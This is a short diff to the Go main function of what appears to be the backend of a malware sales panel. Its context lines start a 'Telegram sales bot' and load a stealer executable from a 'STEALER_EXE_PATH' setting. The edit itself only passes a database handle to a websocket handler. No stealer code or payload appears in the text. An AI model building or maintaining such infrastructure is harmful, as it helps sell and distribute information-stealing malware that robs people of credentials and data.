@@ -228,7 +228,7 @@ func main() {
 	// Start Telegram sales bot
 	tgBot := bot.New(sqlDB)
 	go tgBot.Start()
-	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret, allowedOrigins))
+	r.Get("/ws", ws.ServeWs(wsHub, sqlDB, jwtSecret, allowedOrigins))
 
 	stealerPath := getEnv("STEALER_EXE_PATH", "")
 	var stealerExe []byte
